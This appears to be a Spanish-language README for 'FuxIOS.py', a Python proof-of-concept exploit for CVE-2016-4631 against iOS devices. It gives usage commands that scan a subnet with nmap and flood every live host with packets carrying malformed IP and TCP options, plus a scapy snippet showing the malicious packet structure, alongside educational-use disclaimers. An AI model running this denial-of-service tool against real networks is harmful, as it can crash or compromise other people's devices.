# FuxIOS.py v2.0 - CVE-2016-4631 Exploit PoC

[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)

## � Nota Personal (2025)

> **¿Por qué publico esto ahora?** 
> 
> Mientras revisaba viejos discos duros y repositorios olvidados, me encontré con este script que escribí hace años cuando apenas comenzaba mi carrera en ciberseguridad. Era una época diferente - Python 2.7 dominaba, las vulnerabilidades como CVE-2016-4631 eran el pan de cada día, y cada PoC que funcionaba se sentía como una pequeña victoria.
>
> Al ver este código después de tanto tiempo, no pude evitar sentir nostalgia. Recordé esas noches depurando exploits, la emoción de ver "Payload sent successfully", y cómo cada script era un paso más en mi aprendizaje. Aunque hoy en día trabajo con tecnologías mucho más avanzadas, este pequeño script representa esos primeros pasos en el mundo de la seguridad ofensiva.
>
> Decidí modernizarlo y subirlo no solo por nostalgia, sino porque creo que puede ser útil para otros que están comenzando su camino en ciberseguridad. Es un recordatorio de que todos empezamos en algún lugar, y que esos primeros scripts "simples" son la base de todo lo que viene después.
>
> **F0LloW_Th3_R4ts** era mi firma de entonces... algunos códigos nunca se olvidan. 🐀
>
> *- BONKERS, Julio 2025*

## �📋 Descripción

FuxIOS.py es un Proof of Concept (PoC) actualizado para la vulnerabilidad **CVE-2016-4631** que afecta a dispositivos iOS. Esta versión ha sido completamente reescrita y modernizada para Python 3 con mejoras significativas en funcionalidad, seguridad y usabilidad.

### 🔍 CVE-2016-4631
- **Tipo**: Denial of Service / Remote Code Execution
- **Afectados**: Dispositivos iOS (iPhone, iPad)
- **Vector**: Opciones IP malformadas
- **Impacto**: Crash del sistema o ejecución remota de código

## ✨ Mejoras v2.0

### 🆕 Nuevas Características
- ✅ **Python 3.7+** totalmente compatible
- ✅ **Logging avanzado** con archivos de registro
- ✅ **Validación de entrada** robusta
- ✅ **Argumentos de línea de comandos** con argparse
- ✅ **Compatibilidad Windows/Linux** mejorada
- ✅ **Manejo de errores** exhaustivo
- ✅ **Type hints** para mejor desarrollo
- ✅ **Documentación** completa

### 🔧 Correcciones
- ❌ **Variable incorrecta** `list_of_ips` → `list_ips`
- ❌ **Imports faltantes** agregados
- ❌ **Detección de privilegios** multiplataforma
- ❌ **Validación IP/subnet** implementada

## 🚀 Instalación

### Requisitos Previos
```bash
# Instalar nmap (requerido por python-nmap)
# Windows: Descargar desde https://nmap.org/download.html
# Linux: sudo apt-get install nmap
# macOS: brew install nmap
```

### Instalación de Dependencias
```bash
# Clonar repositorio
git clone <repo-url>
cd FuxiOS

# Instalar dependencias
pip install -r requirements.txt

# O manualmente:
pip install scapy python-nmap
```

## 🎯 Uso

### Modo Comando (Recomendado)
```bash
# Uso básico
sudo python3 FuxIOS.py

# Configuración personalizada
sudo python3 FuxIOS.py -s 192.168.1.100 -n 192.168.1.0/24

# Opciones avanzadas
sudo python3 FuxIOS.py -s 192.168.1.100 -n 192.168.1.0/24 -m 50 -d 0.1

# Ver ayuda
python3 FuxIOS.py -h
```

### Modo Interactivo (Compatibilidad)
```bash
sudo python3 FuxIOS.py --interactive
```

### Parámetros Disponibles
- `-s, --source`: IP origen del ataque (default: 192.168.1.95)
- `-n, --network`: Subred objetivo (default: 192.168.1.0/24)
- `-m, --max-payload`: Tamaño máximo del payload (default: 40)
- `-d, --delay`: Retraso entre paquetes en segundos (default: 0.2)
- `--interactive`: Modo interactivo para compatibilidad

## 📊 Características Técnicas

### Funcionamiento
1. **Escaneo de red**: Utiliza nmap para descubrir hosts activos
2. **Generación de payload**: Crea payloads incrementales malformados
3. **Envío de paquetes**: Transmite paquetes TCP con opciones IP/TCP maliciosas
4. **Logging**: Registra toda la actividad en archivo y consola

### Estructura del Ataque
```python
# Paquete malicioso
IP(src=source_ip, dst=target_ip, options=malformed_payload) / 
TCP(dport=80, flags="S", options=[(19, b"x"*18), (19, b"x"*18)])
```

## ⚠️ Advertencias de Seguridad

### 🔴 IMPORTANTE
- **Solo para fines educativos y pruebas autorizadas**
- **Requiere privilegios de administrador/root**
- **Usar únicamente en entornos controlados**
- **Obtener autorización explícita antes del uso**

### Uso Ético
Este tool debe utilizarse exclusivamente para:
- ✅ Investigación de seguridad
- ✅ Pruebas de penetración autorizadas
- ✅ Fines educativos
- ✅ Auditorías de seguridad legítimas

## 📝 Logs y Debugging

Los logs se guardan en `fuxios_exploit.log` e incluyen:
- Timestamp de cada operación
- Hosts descubiertos durante el escaneo
- Paquetes enviados con detalles
- Errores y excepciones

## 🔧 Troubleshooting

### Problemas Comunes

**Error: "No module named 'scapy'"**
```bash
pip install scapy
```

**Error: "No module named 'nmap'"**
```bash
pip install python-nmap
# Y asegúrate de tener nmap instalado en el sistema
```

**Error: "Permission denied"**
```bash
# Linux/macOS
sudo python3 FuxIOS.py

# Windows
# Ejecutar PowerShell/CMD como administrador
```

**Windows: "WinPcap/Npcap not found"**
- Instalar Npcap desde: https://nmap.org/npcap/

## 📋 Changelog

### v2.0 (2025)
- Reescrito completamente para Python 3
- Agregado sistema de logging
- Implementada validación de entrada
- Añadido soporte de argumentos CLI
- Mejorada compatibilidad multiplataforma
- Corregidos todos los bugs de la versión original
- Agregada documentación completa

### v1.0 (Original)
- PoC básico para CVE-2016-4631
- Python 2.7
- Modo interactivo únicamente

## 📜 Licencia

Este proyecto es solo para fines educativos. El autor no se hace responsable del mal uso de esta herramienta.

## 👤 Créditos

- **Autor Original**: 3xplo1t_
- **Actualización v2.0**: Modernización para Python 3
- **CVE**: CVE-2016-4631

---

**Recuerda**: "F0LloW_Th3_R4ts <:8)~~ <:8)~~"
